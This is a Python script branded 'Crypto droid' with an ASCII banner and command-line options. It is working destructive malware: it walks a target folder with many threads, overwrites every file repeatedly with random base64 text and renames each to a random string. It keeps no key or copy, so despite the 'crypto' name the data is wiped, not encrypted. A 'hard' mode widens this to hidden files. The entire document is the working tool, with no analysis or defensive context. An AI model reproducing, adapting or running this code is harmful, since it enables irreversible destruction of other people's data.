import os
import sys
import time
import random
import base64

from threading import Thread
from datetime import datetime

thread_need = 10
thread_work = 0
method = 'lite'
folder = './'


print("""

 /$$   /$$                                              /$$      
| $$$ | $$                                             | $$      
| $$$$| $$ /$$  /$$$$$$   /$$$$$$   /$$$$$$  /$$    /$$| $$   /$$
| $$ $$ $$|__/ /$$__  $$ /$$__  $$ /$$__  $$|  $$  /$$/| $$  /$$/
| $$  $$$$ /$$| $$  \ $$| $$  \__/| $$  \ $$ \  $$/$$/ | $$$$$$/ 
| $$\  $$$| $$| $$  | $$| $$      | $$  | $$  \  $$$/  | $$_  $$ 
| $$ \  $$| $$| $$$$$$$/| $$      |  $$$$$$/   \  $/   | $$ \  $$
|__/  \__/| $$| $$____/ |__/       \______/     \_/    |__/  \__/
     /$$  | $$| $$                                               
    |  $$$$$$/| $$                                               
     \______/ |__/                                               
                                                                                                                                                             
""")


def filer_path(path_files):
    good_files = []
    for files in path_files:
        if '.' != files[:1] and 'root' not in files:
            good_files.append(files)

    return good_files


def crypto_file(file_name, save_path):
    global thread_work

    thread_work += 1

    all_liters = 'qazxswedcvfrtgbnhyujmkiolpQAZXSWEDCVFRTGBNHYUJMKIOLP1234567890!@#$%^&*()'
    all_names = 'qazxswedcvfrtgbnhyujmkiolpQAZXSWEDCVFRTGBNHYUJMKIOLP1234567890'
    crypto_world = ['q', 'a', 'z', 'x', 's', 'w', 'e', 'd', 'c', 'v', 'f', 'r', 't', 'g', 'b', 'n', 'h', 'y', 'u', 'j',
                    'm', 'k', 'i', 'o', 'l', 'p', 'Q', 'A', 'Z', 'X', 'S', 'W', 'E', 'D', 'C', 'V', 'F', 'R', 'T', 'G',
                    'B', 'N', 'H', 'Y', 'U', 'J', 'M', 'K', 'I', 'O', 'L', 'P', '1', '2', '3', '4', '5', '6', '7', '8',
                    '9', '0']

    for _ in range(random.randint(random.randint(5, 10), random.randint(13, 17))):
        try:
            number_create = int(str(datetime.timestamp(datetime.now()))[-3:])
            lvl_one = ''.join([random.choice(list(all_liters)) for x in range(number_create)])

            for _ in range(3, 6):
                for replace_world in range(len(lvl_one) + 1):
                    lvl_one = lvl_one.replace(lvl_one[replace_world-1:replace_world], crypto_world[random.randint(0, len(crypto_world)-1)])

            lvl_two = base64.b64encode(lvl_one.encode('ascii'))

            with open(file_name, 'wb+') as f_crypto:
                f_crypto.write(lvl_two)
        except Exception as e:
            print(f"[ERROR] file: {file_name}\n\t{e}")

    new_name = ''.join([random.choice(list(all_names)) for x in range(random.randint(9, 17))])
    os.rename(file_name, f"{save_path}/{new_name}")

    thread_work -= 1


def main():
    print('[!]Start work!\n[!]Scan path')

    if method == 'lite':
        all_files = filer_path(os.listdir(folder))
    else:
        all_files = os.listdir(folder)

    for crypto_path in all_files:
        print(f'[!]GET: {crypto_path}')
        for root, dirs, files in os.walk(f"{folder}/{crypto_path}"):
            for get_crypto in files:
                Thread(target=crypto_file, args=(f"{root}/{get_crypto}", root, )).start()
                while thread_work >= thread_need:
                    time.sleep(0.3)


if __name__ == "__main__":
    arg_start = sys.argv

    if '--help' in arg_start or '--h' in arg_start:
        print("Crypto droid -- 0.0.3\n",
              "\t--thread {number}: default 10\n\t\tExample: python3 main.py --thread 15\n",
              "\t--folder {path}: default ./\n\t\tExample: python3 main.py --folder storage/download\n",
              "\t--method {type}: default lite\n\t\tExample: python3 main.py --method hard\n")
        quit()

    if not len(arg_start) > 2:
        print('pleas use command --help')
        quit()

    if '--thread' in arg_start:
        thread_need = int(arg_start[arg_start.index('--thread') + 1])

    if '--folder' in arg_start:
        folder = arg_start[arg_start.index('--folder') + 1]

    if '--method' in arg_start:
        method = arg_start[arg_start.index('--method') + 1]

    main()
